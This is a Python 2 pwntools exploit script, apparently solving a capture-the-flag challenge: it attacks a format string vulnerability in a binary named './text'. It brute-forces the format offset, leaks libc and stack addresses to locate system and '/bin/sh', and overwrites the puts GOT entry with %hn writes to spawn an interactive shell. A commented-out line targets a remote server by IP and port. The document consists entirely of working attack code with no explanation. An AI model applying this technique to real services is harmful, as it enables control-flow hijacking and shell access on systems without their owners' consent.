from pwn import *

def offset_finder():
    for x in range (1, 40):
        p = process("./text")
        
        print "Offset number {}".format(x)

        payload = ""
        payload += "A" * 4
        payload += "%{}$p".format(x)

        p.sendlineafter(">", payload)

        p.recvuntil("AAAA")
        stack_value = p.recvline()
        
        if stack_value.find("00c") != -1:
            print "Offset found!"
            print "Stack value: {}".format(stack_value)
            break
        else:
            print "Stack value: {}".format(stack_value)
            
        p.close()

def test():
    p = process("./text")
    gdb.attach(p, '''
                b *0x080485d7
                b *0x080485e6
                c
                ''')
    p.sendline("%35$p")
    p.recvuntil("> ")

    libc_leak = int(p.recvline(), 16)
    libc_base = libc_leak - 0x018e81
    libc_system = libc_base + 0x03d200
    libc_binsh = libc_base + 0x17e0cf

    p.sendline("%2$p")
    p.recvuntil("> ")

    stack_leak = int(p.recvline(), 16)
    stack_leak = stack_leak - 0x84

    log.info("Libc leak : {}".format(hex(libc_leak)))
    log.info("Libc base : {}".format(hex(libc_base)))
    log.info("Libc system : {}".format(hex(libc_system)))
    log.info("Libc /bin/sh : {}".format(hex(libc_binsh)))
    log.info("Stack leak : {}".format(hex(stack_leak)))

    overwrite = str(hex(libc_system))[2:]
    first_overwrite = int(overwrite[4:], 16)
    log.info("First overwrite: {} or in hex {}".format(first_overwrite, hex(first_overwrite)))
    second_overwrite = int(overwrite[:4], 16)
    log.info("Second overwrite: {} or in hex {}".format(second_overwrite, hex(second_overwrite)))

    p.interactive()

def exploit():
    p = process("./text")
    # p = remote("103.200.7.156", 2102)
    puts_got = 0x804a014
    shell = 0x08048526

    payload = ''
    payload += p32(puts_got)
    # payload += p32(puts_got + 2)
    payload += "%7${}p".format(0x8526 - len(payload))
    payload += "%7$hn"
    # payload += "%{}p".format(0x10804 - 0x8526)
    # payload += "%8$hn"
    gdb.attach(p, '''
            b *0x080485ec
            c
    ''')
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    # test()
    exploit()
    # offset_finder()
